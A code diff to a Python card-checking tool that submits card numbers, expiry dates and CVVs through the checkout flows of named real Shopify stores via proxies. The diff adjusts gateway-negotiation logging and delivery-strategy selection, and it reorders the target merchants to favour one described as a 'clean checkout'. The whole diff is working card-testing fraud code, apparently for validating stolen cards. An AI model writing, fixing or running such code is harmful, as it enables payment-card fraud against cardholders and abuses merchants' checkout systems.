@@ -464,6 +464,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
                 if not sp1 or not isinstance(sp1, dict):
                     break
                 running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
+                logger.info(f"[NEGOTIATE] del_type={del_type} strategy={delivery_strategy} pmi={api_pmi} gw={api_gw} payment={sp1.get('payment', {}).get('__typename', '?')}")
                 if api_pmi and not payment_method_id: payment_method_id = api_pmi
                 if api_gw: gw_name = api_gw
                 if delivery_strategy and del_type == 'FilledDeliveryTerms':
@@ -741,7 +742,7 @@ def _build_selected_delivery(delivery_strategy, addr_block, phone):
     return {
         'deliveryLines': [{
             'destination': {'streetAddress': addr_block},
-            'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}},
+            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
             'targetMerchandiseLines': {'any': True},
             'deliveryMethodTypes': ['SHIPPING'],
             'expectedTotalPrice': {'any': True},
@@ -777,11 +778,11 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
     if site:
         sites = [site.replace("https://", "").replace("http://", "").rstrip("/")]
     else:
-        # Try confirmed working sites first, then random others
-        sites = ["couch-collectibles.myshopify.com", "www.teeinblue.com"]
+        # Try teeinblue first (clean checkout), then couch-collectibles, then others
+        sites = ["www.teeinblue.com", "couch-collectibles.myshopify.com"]
         other_sites = [s for s in SHOPIFY_SITES if s not in sites]
         random.shuffle(other_sites)
-        sites.extend(other_sites[:4])  # Try 2 confirmed + 4 others = 6 total
+        sites.extend(other_sites[:4])
 
     for s in sites:
         logger.info(f"Checking {card_short} on {s} proxy={proxy_url is not None}")
